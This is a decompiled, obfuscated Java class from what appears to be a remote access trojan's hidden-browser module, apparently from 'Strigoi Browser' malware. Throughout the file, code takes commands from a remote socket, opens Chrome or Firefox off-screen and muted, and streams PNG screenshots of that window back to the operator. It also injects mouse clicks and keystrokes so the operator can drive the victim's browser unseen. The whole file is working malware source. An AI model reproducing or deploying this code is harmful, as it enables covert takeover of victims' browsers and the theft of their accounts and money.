package carLambo;

import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef.HBITMAP;
import com.sun.jna.platform.win32.WinDef.HDC;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.platform.win32.WinDef.LPARAM;
import com.sun.jna.platform.win32.WinDef.RECT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinGDI.BITMAPINFO;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.platform.win32.WinUser.WNDENUMPROC;
import com.sun.jna.ptr.PointerByReference;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;

public class BrowserManager {
   HBrowserNativeApis sdfsldf = new HBrowserNativeApis();
   HWND browserHwnd = null;
   private boolean isConnected = true;
   private String host;
   private boolean gsbthstgb = false;
   private int port;
   private Socket socket;

   // $FF: synthetic method
   private void sdfsldf(String var1) {
      try {
         if (!var1.startsWith("+") && !var1.startsWith("^") && !var1.startsWith("%")) {
            int var5;
            if (((var5 = Integer.parseInt(var1)) < 97 || var5 > 122) && (var5 < 48 || var5 > 61)) {
               if (var5 == 173) {
                  HBrowserNativeApis.sabretb(this.browserHwnd, 258, new WPARAM((long)var5), new LPARAM(1L));
                  return;
               }

               HBrowserNativeApis.sabretb(this.browserHwnd, 256, new WPARAM((long)Integer.parseInt(var1)), this.sdfsldf((short)1, (byte)30, false, false));
               HBrowserNativeApis.sabretb(this.browserHwnd, 257, new WPARAM((long)Integer.parseInt(var1)), this.sdfsldf((short)1, (byte)30, false));
               return;
            }

            HBrowserNativeApis.sabretb(this.browserHwnd, 258, new WPARAM((long)var5), new LPARAM(1L));
            return;
         }

         String var2 = var1.substring(0, 1);
         var1 = var1.substring(1);
         WPARAM var4 = new WPARAM((long)Integer.parseInt(var1));
         if (var2.equals("+")) {
            HBrowserNativeApis.sdfsldf((byte)16, (byte)69, 0, 0);
            HBrowserNativeApis.sabretb(this.browserHwnd, 256, var4, this.sdfsldf((short)1, (byte)30, false, false));
            HBrowserNativeApis.sabretb(this.browserHwnd, 257, var4, this.sdfsldf((short)1, (byte)30, false));
            HBrowserNativeApis.sdfsldf((byte)16, (byte)69, 2, 0);
            return;
         }

         if (var2.equals("^")) {
            HBrowserNativeApis.sdfsldf((byte)17, (byte)69, 1, 0);
            Thread.sleep(250L);
            HBrowserNativeApis.sabretb(this.browserHwnd, 256, var4, this.sdfsldf((short)1, (byte)30, false, false));
            HBrowserNativeApis.sabretb(this.browserHwnd, 257, var4, this.sdfsldf((short)1, (byte)30, false));
            Thread.sleep(250L);
            HBrowserNativeApis.sdfsldf((byte)17, (byte)69, 3, 0);
            return;
         }

         if (var2.equals("%")) {
            HBrowserNativeApis.sdfsldf((byte)18, (byte)69, 0, 0);
            HBrowserNativeApis.sabretb(this.browserHwnd, 256, var4, this.sdfsldf((short)1, (byte)30, false, false));
            HBrowserNativeApis.sabretb(this.browserHwnd, 257, var4, this.sdfsldf((short)1, (byte)30, false));
            HBrowserNativeApis.sdfsldf((byte)18, (byte)69, 2, 0);
            return;
         }
      } catch (Exception var3) {
         Logger.getLogger(BrowserManager.class.getName()).log(Level.SEVERE, (String)null, var3);
      }

   }

   // $FF: synthetic method
   private static LPARAM sdfsldf(int var0, int var1) {
      return new LPARAM((long)(var1 << 16 | var0 & '\uffff'));
   }

   // $FF: synthetic method
   private static String sabretb() {
      if ((new File("C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe")).exists()) {
         return "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe";
      } else {
         return (new File("C:\\Program Files\\Mozilla Firefox\\firefox.exe")).exists() ? "C:\\Program Files\\Mozilla Firefox\\firefox.exe" : "firefox.exe";
      }
   }

   // $FF: synthetic method
   static void listener(BrowserManager var0) {
      var0 = var0;

      try {
         while(var0.isConnected) {
            byte[] var1 = new byte[1];
            StringBuilder var3 = new StringBuilder();

            int var2;
            do {
               if ((var2 = var0.socket.getInputStream().read(var1, 0, 1)) == -1) {
                  throw new RuntimeException();
               }

               var3.append(new String(var1, 0, var2));
            } while(!var3.toString().endsWith("\r\n"));

            String var7 = var3.toString();
            String[] var8;
            if ((var8 = var7.substring(0, var7.indexOf("\r\n")).split("\\|"))[0].equals("start")) {
               var0.socket.close();
               var0.socket = null;
               var0.socket = new Socket(var0.host, var0.port);
               OutputStream var9 = var0.socket.getOutputStream();
               String var6 = "start-hbrowser";
               String var4 = String.valueOf(var6.getBytes().length + "\r\n\r\n");
               var9.write(var4.getBytes());
               var9.write(var6.getBytes());
               var9.flush();
               var0.gsbthstgb = true;
               String var11 = var8[1];
               (new Thread(new BrowserInfoThread(var0, var11))).start();
            } else if (var8[0].equals("stop")) {
               var0.gsbthstgb = false;
               var0.fgsbsfgsb();
               var0.browserHwnd = null;
            } else {
               if (var8[0].equals("exit")) {
                  var0.gsbthstgb = false;
                  var0.fgsbsfgsb();
                  var0.browserHwnd = null;
                  var0.isConnected = false;
                  return;
               }

               if (var8[0].equals("mouse-event")) {
                  Point var10;
                  int var12;
                  RECT var13;
                  int var10001;
                  if (var8[1].equals("left")) {
                     var10001 = Integer.parseInt(var8[2]);
                     var12 = Integer.parseInt(var8[3]);
                     var2 = var10001;
                     var13 = new RECT();
                     HBrowserNativeApis.sdfsldf(var0.browserHwnd, var13);
                     var10 = new Point(var2 + 10000 - var13.left, var12 + 10000 - var13.top);
                     HBrowserNativeApis.sabretb(var0.browserHwnd, 513, new WPARAM(1L), sdfsldf(var10.x, var10.y));
                     HBrowserNativeApis.sabretb(var0.browserHwnd, 514, new WPARAM(0L), sdfsldf(var10.x, var10.y));
                  } else if (var8[1].equals("right")) {
                     var10001 = Integer.parseInt(var8[2]);
                     var12 = Integer.parseInt(var8[3]);
                     var2 = var10001;
                     var13 = new RECT();
                     HBrowserNativeApis.sdfsldf(var0.browserHwnd, var13);
                     var10 = new Point(var2 + 10000 - var13.left, var12 + 10000 - var13.top);
                     HBrowserNativeApis.sabretb(var0.browserHwnd, 516, new WPARAM(1L), sdfsldf(var10.x, var10.y));
                     HBrowserNativeApis.sabretb(var0.browserHwnd, 517, new WPARAM(0L), sdfsldf(var10.x, var10.y));
                  }
               } else if (var8[0].equals("key-event")) {
                  var0.sdfsldf(var8[1]);
               }
            }
         }
      } catch (Exception var5) {
         var0.isConnected = false;
      }

   }

   // $FF: synthetic method
   private static String sabretb(String var0) {
      return var0.substring(0, 1);
   }

   // $FF: synthetic method
   private static String dfhttegd() {
      if ((new File("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe")).exists()) {
         return "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
      } else {
         return (new File("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")).exists() ? "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" : "chrome.exe";
      }
   }

   // $FF: synthetic method
   private LPARAM sdfsldf(short var1, byte var2, boolean var3, boolean var4) {
      return sdfsldf((short)1, (byte)30, false, false, false);
   }

   // $FF: synthetic method
   private static boolean bsgshsbs() {
      String var0 = ConnectionUtil.getSystemVersion()[0].toLowerCase();

      try {
         if (Double.parseDouble(var0.split(" ")[2]) >= 8.1D) {
            return true;
         }
      } catch (Exception var1) {
         ;
      }

      return false;
   }

   // $FF: synthetic method
   private byte[] getBrowserData() {
      try {
         RECT var1 = new RECT();
         HBrowserNativeApis.sdfsldf(this.browserHwnd, var1);
         int var2 = var1.right - var1.left;
         int var9 = var1.bottom - var1.top;
         HDC var3;
         HDC var4 = HBrowserNativeApis.sabretb(var3 = HBrowserNativeApis.sdfsldf(this.browserHwnd));
         BITMAPINFO var5;
         BITMAPINFO var10000 = var5 = new BITMAPINFO();
         var10000.bmiHeader.biWidth = var2;
         var10000.bmiHeader.biHeight = -var9;
         var10000.bmiHeader.biPlanes = 1;
         var10000.bmiHeader.biBitCount = 32;
         var10000.bmiHeader.biCompression = 0;
         var10000.bmiHeader.biSizeImage = var2 * var9 << 2;
         PointerByReference var6 = new PointerByReference();
         HBITMAP var12 = HBrowserNativeApis.sdfsldf(var3, var5, 0, var6, Pointer.createConstant(0), 0);
         HANDLE var7 = HBrowserNativeApis.sdfsldf((HDC)var4, (HANDLE)var12);
         if (bsgshsbs()) {
            HBrowserNativeApis.sdfsldf(this.browserHwnd, (HDC)var4, 2);
         } else {
            HBrowserNativeApis.sdfsldf(this.browserHwnd, (HDC)var4, 0);
         }

         HBrowserNativeApis.sdfsldf(this.browserHwnd, var3);
         HBrowserNativeApis.sdfsldf(var4, var7);
         Pointer var11 = var6.getValue();
         BufferedImage var13;
         (var13 = new BufferedImage(var2, var9, 1)).setRGB(0, 0, var2, var9, var11.getIntArray(0L, var2 * var9), 0, var2);
         HBrowserNativeApis.sdfsldf(var4);
         HBrowserNativeApis.sdfsldf((HANDLE)var12);
         ByteArrayOutputStream var10 = new ByteArrayOutputStream();
         ImageIO.write(var13, "png", var10);
         return var10.toByteArray();
      } catch (IOException var8) {
         return new byte[0];
      }
   }

   // $FF: synthetic method
   private void sfsrgsbd() {
      while(true) {
         try {
            if (this.isConnected) {
               byte[] var1 = new byte[1];
               StringBuilder var3 = new StringBuilder();

               do {
                  int var2;
                  if ((var2 = this.socket.getInputStream().read(var1, 0, 1)) == -1) {
                     throw new RuntimeException();
                  }

                  var3.append(new String(var1, 0, var2));
               } while(!var3.toString().endsWith("\r\n"));

               String var7 = var3.toString();
               String[] var8;
               if ((var8 = var7.substring(0, var7.indexOf("\r\n")).split("\\|"))[0].equals("start")) {
                  this.socket.close();
                  this.socket = null;
                  this.socket = new Socket(this.host, this.port);
                  OutputStream var9 = this.socket.getOutputStream();
                  String var6 = "start-hbrowser";
                  String var4 = String.valueOf(var6.getBytes().length + "\r\n\r\n");
                  var9.write(var4.getBytes());
                  var9.write(var6.getBytes());
                  var9.flush();
                  this.gsbthstgb = true;
                  String var10 = var8[1];
                  (new Thread(new BrowserInfoThread(this, var10))).start();
                  continue;
               }

               if (var8[0].equals("stop")) {
                  this.gsbthstgb = false;
                  this.fgsbsfgsb();
                  this.browserHwnd = null;
                  continue;
               }

               if (var8[0].equals("exit")) {
                  this.gsbthstgb = false;
                  this.fgsbsfgsb();
                  this.browserHwnd = null;
                  this.isConnected = false;
                  return;
               }

               if (var8[0].equals("mouse-event")) {
                  if (var8[1].equals("left")) {
                     this.dfhttegd(Integer.parseInt(var8[2]), Integer.parseInt(var8[3]));
                     continue;
                  }

                  if (var8[1].equals("right")) {
                     this.sabretb(Integer.parseInt(var8[2]), Integer.parseInt(var8[3]));
                  }
                  continue;
               }

               if (var8[0].equals("key-event")) {
                  this.sdfsldf(var8[1]);
               }
               continue;
            }
         } catch (Exception var5) {
            this.isConnected = false;
         }

         return;
      }
   }

   // $FF: synthetic method
   private void dfhttegd(String var1) {
      try {
         String var2 = "Strigoi Browser";
         BrowserManager var10000;
         if (var1.equals("Chrome")) {
            ProcessBuilder var3 = new ProcessBuilder(new String[]{dfhttegd(), "--new-window", "data:text/html,<title>Strigoi Browser</title>", "--mute-audio", "--disable-audio", "--window-position=" + String.valueOf(fgssdg().width - 5) + "," + (fgssdg().height - 100)});
            var10000 = this;
            var3.start();
         } else {
            if (var1.equals("Firefox")) {
               (new ProcessBuilder(new String[]{sabretb(), "-new-window", "data:text/html,<title>Strigoi Browser</title>"})).start();
            }

            var10000 = this;
         }

         var10000.searchWindow(var2);
         int var8 = 0;
         var10000 = this;

         while(var10000.browserHwnd == null) {
            ++var8;
            Thread.sleep(1000L);
            if (var8 >= 8) {
               return;
            }

            var10000 = this;
            this.searchWindow(var2);
         }

         HBrowserNativeApis.sdfsldf(this.browserHwnd, 0);
         HBrowserNativeApis.sdfsldf((HWND)this.browserHwnd, -20, 128);
         HBrowserNativeApis.sdfsldf(this.browserHwnd, 5);
         Rectangle var9 = fgssdg();
         int var5 = (int)((double)var9.width * 0.7D);
         int var7 = (int)((double)var9.height * 0.7D);
         HBrowserNativeApis.sdfsldf(this.browserHwnd, new HWND(Pointer.createConstant(1)), 10000, 10000, var5, var7, 64);
         HWND var6 = null;
         var8 = 0;

         for(HWND var10 = null; var10 == null; var10 = var6) {
            var6 = HBrowserNativeApis.sabretb("Default Browser");
            if (var8 >= 7) {
               break;
            }

            ++var8;
            Thread.sleep(250L);
         }

         if (var6 != null) {
            HBrowserNativeApis.sdfsldf(var6, 16, new WPARAM(0L), new LPARAM(0L));
            return;
         }
      } catch (Exception var4) {
         System.out.println(var4.getMessage());
      }

   }

   // $FF: synthetic method
   private void bsgshsbs(String var1) {
      this.dfhttegd(var1);
      if (this.browserHwnd != null) {
         BrowserManager var10000 = this;

         while(var10000.gsbthstgb) {
            try {
               byte[] var6;
               if ((var6 = this.getBrowserData()).length > 0) {
                  String var2 = var6.length + "<>";
                  this.socket.getOutputStream().write(var2.getBytes());
                  this.socket.getOutputStream().write(var6);
                  this.socket.getOutputStream().flush();
               }
            } catch (Exception var4) {
               try {
                  Thread.sleep(500L);
               } catch (InterruptedException var3) {
                  Logger.getLogger(BrowserManager.class.getName()).log(Level.SEVERE, (String)null, var3);
               }
            }

            try {
               Thread.sleep(500L);
            } catch (InterruptedException var5) {
               Logger.getLogger(BrowserManager.class.getName()).log(Level.SEVERE, (String)null, var5);
               var10000 = this;
               continue;
            }

            var10000 = this;
         }

      }
   }

   // $FF: synthetic method
   private void sabretb(int var1, int var2) {
      RECT var3 = new RECT();
      HBrowserNativeApis.sdfsldf(this.browserHwnd, var3);
      Point var4 = new Point(var1 + 10000 - var3.left, var2 + 10000 - var3.top);
      HBrowserNativeApis.sabretb(this.browserHwnd, 516, new WPARAM(1L), sdfsldf(var4.x, var4.y));
      HBrowserNativeApis.sabretb(this.browserHwnd, 517, new WPARAM(0L), sdfsldf(var4.x, var4.y));
   }

   // $FF: synthetic method
   private void fgsbsfgsb() {
      if (this.browserHwnd != null) {
         HBrowserNativeApis.sdfsldf(this.browserHwnd, 16, new WPARAM(0L), new LPARAM(0L));
         this.browserHwnd = null;
      }

   }

   // $FF: synthetic method
   private LPARAM sdfsldf(short var1, byte var2, boolean var3) {
      return sdfsldf((short)1, (byte)30, false, true, true);
   }

   public static String sdfsldf() {
      String var0 = "";
      if (!dfhttegd().equals("chrome.exe")) {
         var0 = (new StringBuilder()).insert(0, var0).append("Chrome").toString();
      }

      String var10000;
      label21: {
         if (!sabretb().equals("firefox.exe")) {
            if (var0.equals("")) {
               var10000 = var0 = "Firefox";
               break label21;
            }

            var0 = (new StringBuilder()).insert(0, var0).append(",Firefox").toString();
         }

         var10000 = var0;
      }

      if (var10000.equals("")) {
         var0 = ".";
      }

      return var0;
   }

   // $FF: synthetic method
   private void dfhttegd(int var1, int var2) {
      RECT var3 = new RECT();
      HBrowserNativeApis.sdfsldf(this.browserHwnd, var3);
      Point var4 = new Point(var1 + 10000 - var3.left, var2 + 10000 - var3.top);
      HBrowserNativeApis.sabretb(this.browserHwnd, 513, new WPARAM(1L), sdfsldf(var4.x, var4.y));
      HBrowserNativeApis.sabretb(this.browserHwnd, 514, new WPARAM(0L), sdfsldf(var4.x, var4.y));
   }

   BrowserManager(Socket var1) {
      this.socket = var1;

      try {
         this.host = var1.getInetAddress().getHostAddress();
         this.port = var1.getPort();
      } catch (Exception var2) {
         this.isConnected = false;
      }

      (new Thread(new BrowserListenerThread(this))).start();
   }

   // $FF: synthetic method
   private void searchWindow(String var1) {
      HBrowserNativeApis.sdfsldf((WNDENUMPROC)(new AvailableBrowserSearch(this, var1)), (Pointer)null);
   }

   // $FF: synthetic method
   private static LPARAM sdfsldf(short var0, byte var1, boolean var2, boolean var3, boolean var4) {
      int var5 = var0 | var1 << 16;
      if (var2) {
         var5 |= 65536;
      }

      if (var3) {
         var5 |= 1073741824;
      }

      if (var4) {
         var5 |= Integer.MIN_VALUE;
      }

      return new LPARAM((long)var5);
   }

   // $FF: synthetic method
   static void sendBrowserInfo(BrowserManager var0, String var1) {
      BrowserManager var10000 = var0 = var0;
      var10000.dfhttegd(var1);
      if (var10000.browserHwnd != null) {
         var10000 = var0;

         while(var10000.gsbthstgb) {
            try {
               byte[] var6;
               if ((var6 = var0.getBrowserData()).length > 0) {
                  String var2 = var6.length + "<>";
                  var0.socket.getOutputStream().write(var2.getBytes());
                  var0.socket.getOutputStream().write(var6);
                  var0.socket.getOutputStream().flush();
               }
            } catch (Exception var4) {
               try {
                  Thread.sleep(500L);
               } catch (InterruptedException var3) {
                  Logger.getLogger(BrowserManager.class.getName()).log(Level.SEVERE, (String)null, var3);
               }
            }

            try {
               Thread.sleep(500L);
            } catch (InterruptedException var5) {
               Logger.getLogger(BrowserManager.class.getName()).log(Level.SEVERE, (String)null, var5);
               var10000 = var0;
               continue;
            }

            var10000 = var0;
         }
      }

   }

   // $FF: synthetic method
   private static boolean sfsrgsbd(String var0) {
      return var0.startsWith("+") || var0.startsWith("^") || var0.startsWith("%");
   }

   // $FF: synthetic method
   private static Rectangle fgssdg() {
      return new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
   }
}
